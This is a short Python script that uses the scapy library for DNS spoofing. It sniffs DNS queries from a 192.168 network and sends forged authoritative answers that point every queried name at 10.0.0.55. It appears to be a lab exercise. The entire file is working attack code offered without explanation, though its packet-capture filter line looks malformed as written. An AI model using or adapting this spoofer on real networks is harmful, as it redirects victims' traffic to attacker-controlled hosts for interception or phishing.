from scapy.all import *


def spoofDNS(pkt):
    if (DNS in pkt):
        print("sniff: ", pkt[DNS].qd.qname.decode())
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='10.0.0.55', ttl=172800)

        DNSpkt = DNS(
            id = pkt[DNS].id,
            qd = pkt[DNS].qd,
            aa = 1,
            rd = 0,
            qdcount = 1,
            qr = 1,
            ancount = 1,
            nscount = 0,
            an = Anssec
        )
        spoofpkt = IPpkt / UDPpkt / DNSpkt
        send(spoofpkt)

pkt = sniff(filter = 'udp and (src host 192.168.*.* and dst port 53)', prn = spoofDNS)
